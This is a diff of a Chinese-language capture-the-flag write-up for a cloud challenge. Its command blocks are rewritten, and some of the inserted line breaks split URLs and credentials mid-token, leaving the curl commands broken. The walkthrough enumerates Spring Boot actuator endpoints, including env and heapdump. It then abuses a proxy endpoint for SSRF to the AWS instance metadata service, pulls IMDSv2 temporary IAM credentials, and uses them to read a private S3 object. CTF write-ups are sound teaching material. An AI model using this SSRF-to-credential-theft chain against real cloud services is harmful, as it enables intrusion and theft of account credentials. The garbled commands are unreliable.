@@ -77,7 +77,8 @@ identity-credentials/ec2/security-credentials/ec2-instance 路径：较新格�
 
 步骤 2：查询当前凭证所代表的身份信息；
 
-identity-credentials/ec2/security-credentials/ec2-instance 返回的角色名aws:ec2-instance是 AWS 抽象出来的默认名，更注重隐藏角色名细节（例如用于托管服务中），但不利于权限审计。图 13：识别 identity-credentials/ec2/security-credentials/ec2-instance 的临时凭证的身份信息
+identity-credentials/ec2/security-credentials/ec2-instance 返回的角色名aws:
+ec2-instance是 AWS 抽象出来的默认名，更注重隐藏角色名细节（例如用于托管服务中），但不利于权限审计。图 13：识别 identity-credentials/ec2/security-credentials/ec2-instance 的临时凭证的身份信息
 
 iam/security-credentials/challenge01-5592368返回的角色名challenge01-5592368是真实具体的角色名，更便于识别角色来源、权限分析和安全审计。图 14：识别 iam/security-credentials/challenge01-5592368 的临时凭证的身份信息
 
@@ -185,7 +186,8 @@ SSRF + URL 编码绕过
 
 对presigned URL使用jq -sRr @uri 进行编码，最终成功访问并获取 flag
 
-OSS（Object Storage Service）有几种 Bucket Policy？例如，本题涉及的基于身份的访问控制（如 IAM 用户/角色访问）以及基于请求来源的条件限制（如 aws:Referer）。
+OSS（Object Storage Service）有几种 Bucket Policy？例如，本题涉及的基于身份的访问控制（如 IAM 用户/角色访问）以及基于请求来源的条件限制（如 aws:
+Referer）。
 
 OSS 的签名方式有哪些？例如，本题考察的基于 Access Key 和 Secret 的签名机制，以及 URL 签名（Presigned URL）：临时生成用于访问私有对象的链接。
 
@@ -221,72 +223,31 @@ Reference
 
 
 ```
-curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
-```
-
-
-
-```
+curl https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com
 { "status": "UP" }
-```
-
-
-
-```
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq
-```
-
-
-
-```
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET
-```
-
-
-
-```
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET
 aws s3 ls s3://challenge01-470f711/ --no-sign-request
-```
-
-
-
-```
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq
-```
-
-
-
-```
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq
-```
-
-
-
-```
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]
-```
-
-
-
-```
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq
+curl -s https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]
 { "predicate": "{ [/proxy], params [url]}" }
-```
-
-
-
-```
 {
   "handler": "challenge.Application#proxy(String)",
   "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
 }
-```
-
-
-
-```
 {
   "requestMappingConditions": {
     "consumes": [],
@@ -302,92 +263,34 @@ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappin
     "produces": []
   }
 }
-```
-
-
-
-```
-curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/
-```
-
-
-
-```
+curl https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/
 # 获取 IMDSv2 的 token
-TOKEN=$(curl -s -X PUT 
-  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" 
+TOKEN=$(curl -s -X PUT
+  "https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" 
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 
 # 使用 token 请求 metadata
 curl -s -H "X-aws-ec2-metadata-token: $TOKEN" 
-  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
-```
-
-
-
-```
-curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
-```
-
-
-
-```
-curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
-```
-
-
-
-```
+  "https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
+curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
+curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
 aws configure set aws_access_key_id YOUR_ACCESS_KEY_ID
 aws configure set aws_secret_access_key YOUR_SECRET_ACCESS_KEY
 aws configure set aws_session_token YOUR_SESSION_TOKEN
-```
-
-
-
-```
 aws sts get-caller-identity
-```
-
-
-
-```
 aws s3 ls s3://challenge01-470f711 --recursive
-```
-
-
-
-```
 aws s3 cp s3://challenge01-470f711/private/flag.txt -
-```
-
-
-
-```
 aws s3api get-bucket-policy --bucket challenge01-470f711 --query "Policy" --output text | jq .
-```
-
-
-
-```
-https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/
-```
-
-
-
-```
+https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/
 aws s3 presign s3://challenge01-470f711/private/flag.txt
-```
-
-
-
-```
-curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=<Presigned_URL>"
-```
-
-
-
-```
+curl "https://ctf:
+88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url="
 aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri
 ```
 
